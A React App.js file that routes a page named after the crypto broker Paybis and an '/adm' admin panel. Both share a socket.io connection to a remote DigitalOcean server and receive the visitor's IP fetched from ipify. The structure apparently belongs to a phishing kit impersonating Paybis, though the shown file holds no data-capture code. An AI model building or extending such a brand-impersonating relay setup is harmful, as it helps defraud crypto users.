import React, { useEffect, useState, useRef } from "react";
import "./App.css";
import { Routes, Route } from "react-router-dom";
import axios from "axios";
import { io } from "socket.io-client";
import Paybis from "./corretoras/paybis/paybis";
import Adm from "./adm/adm";

function App() {
  const [ip, setIp] = useState(""); // Estado para armazenar o IP
  const socketRef = useRef(null); // Ref para armazenar o socket


  if (!socketRef.current) {
    socketRef.current = io("https://jellyfish-app-cgoqz.ondigitalocean.app:3333/api");
    console.log(socketRef.current)
  }

  useEffect(() => {
    // Inicializa o socket apenas uma vez e armazena no ref

    async function getData() {
      const res = await axios.get("https://api.ipify.org/?format=json");
      localStorage.setItem("userip", res.data.ip);
      setIp(res.data.ip); // Atualiza o estado do IP
      console.log("a:" + res.data.ip);
    }

    getData();

    // Limpando o socket ao desmontar o componente
    return () => {
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, []); // Dependências vazias para executar apenas na montagem

  return (
    <>
      <Routes>
        <Route
          path="/"
          element={
            <Paybis
              ip={ip}
              socket={socketRef.current}
            />
          }
        />
        <Route
          path="/adm"
          element={
            <Adm
              ip={1}
              socket={socketRef.current}
            />
          }
        />
      </Routes>
    </>
  );
}

export default App;
